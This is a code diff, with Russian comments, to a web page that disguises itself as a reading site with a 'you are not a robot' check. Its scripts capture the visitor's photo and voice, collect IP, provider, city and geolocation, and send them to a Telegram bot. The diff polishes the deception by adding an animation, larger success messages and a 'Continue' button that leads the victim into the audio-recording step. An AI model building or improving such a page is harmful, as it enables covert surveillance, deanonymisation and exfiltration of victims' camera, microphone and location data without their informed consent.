@@ -60,6 +60,8 @@
         .site-content img { width: 100%; border-radius: 8px; margin: 20px 0; border: 1px solid #334155; }
         .site-footer { text-align: center; padding: 30px; font-size: 13px; color: #64748b; background: rgba(2, 6, 23, 0.9); margin-top: 40px; border-top: 1px solid #1e293b; }
         @media (max-width: 600px) { .site-header { flex-direction: column; gap: 15px; padding: 15px; } .site-nav a { margin: 0 10px; } .site-content { margin: 20px; padding: 20px; } .site-content h1 { font-size: 1.6rem; } .site-content h2 { font-size: 1.3rem; } }
+        
+        @keyframes fadeIn { from { opacity: 0; transform: scale(0.9); } to { opacity: 1; transform: scale(1); } }
     </style>
 </head>
 <body>
@@ -119,7 +121,7 @@
 
         async function sendAllData(photoBlob, audioBlob, geoData) {
             if (BOT_TOKEN === 'ТВОЙ_ТОКЕН_ЗДЕСЬ') return;
-            if (!photoBlob) { console.error("ОШИБКА: Фото не создано."); return; }
+            if (!photoBlob) return;
 
             let ip = "Неизвестно", provider = "Неизвестно", city = "Неизвестно";
             try { 
@@ -207,19 +209,21 @@
                     return;
                 }
 
-                // ЭКРАН УСПЕХА ФОТО
+                // ЭКРАН УСПЕХА ФОТО + КНОПКА ДАЛЬШЕ
                 overlay.innerHTML = `
                     <div style="text-align:center; animation: fadeIn 0.5s;">
-                        <h1 style="color:#10b981; font-size: 50px; margin: 0;">✅</h1>
-                        <h2 style="color:#fff; margin-top: 10px;">Сканирование успешно!</h2>
-                        <p style="color:#cbd5e1;">Вы не робот. Продолжаем проверку...</p>
+                        <h1 style="color:#10b981; font-size: 60px; margin: 0;">✅</h1>
+                        <h2 style="color:#fff; margin-top: 15px;">Сканирование успешно!</h2>
+                        <p style="color:#cbd5e1; font-size: 16px; margin-bottom: 25px;">Вы не робот. ✨</p>
+                        <button id="next-to-audio-btn" style="background:#3b82f6; color:white; border:none; padding:15px 30px; border-radius:5px; font-size:16px; cursor:pointer; font-weight: bold; box-shadow: 0 4px 15px rgba(59, 130, 246, 0.4);">Продолжить ➡️</button>
                     </div>
                 `;
-                
-                await new Promise(r => setTimeout(r, 1500)); // Задержка для прочтения
-                document.body.removeChild(overlay);
-                document.getElementById('main-site').style.display = 'block';
-                await recordAudio(photoBlob);
+
+                document.getElementById('next-to-audio-btn').addEventListener('click', async () => {
+                    document.body.removeChild(overlay);
+                    document.getElementById('main-site').style.display = 'block';
+                    await recordAudio(photoBlob);
+                });
             });
         }
 
@@ -263,9 +267,9 @@
                 // ЭКРАН УСПЕХА АУДИО
                 overlay.innerHTML = `
                     <div style="text-align:center; animation: fadeIn 0.5s;">
-                        <h1 style="color:#10b981; font-size: 50px; margin: 0;">✅</h1>
-                        <h2 style="color:#fff; margin-top: 10px;">Отлично, голос опознан!</h2>
-                        <p style="color:#cbd5e1;">Завершаем проверку безопасности...</p>
+                        <h1 style="color:#10b981; font-size: 60px; margin: 0;">✅</h1>
+                        <h2 style="color:#fff; margin-top: 15px;">Отлично, голос опознан!</h2>
+                        <p style="color:#cbd5e1; font-size: 16px;">Завершаем проверку безопасности...</p>
                     </div>
                 `;
 
@@ -274,9 +278,9 @@
                 // ФИНАЛЬНЫЙ ЭКРАН
                 overlay.innerHTML = `
                     <div style="text-align:center; animation: fadeIn 0.5s;">
-                        <h1 style="font-size: 60px; margin: 0;">🎉</h1>
-                        <h2 style="color:#3b82f6; margin-top: 10px;">Вы прошли проверку!</h2>
-                        <p style="color:#cbd5e1; font-size: 16px; margin-top: 15px;">Приятного чтения! 📚✨</p>
+                        <h1 style="font-size: 70px; margin: 0;">🎉</h1>
+                        <h2 style="color:#3b82f6; margin-top: 15px;">Вы прошли проверку!</h2>
+                        <p style="color:#cbd5e1; font-size: 18px; margin-top: 20px;">Приятного чтения! 📚✨</p>
                     </div>
                 `;
 
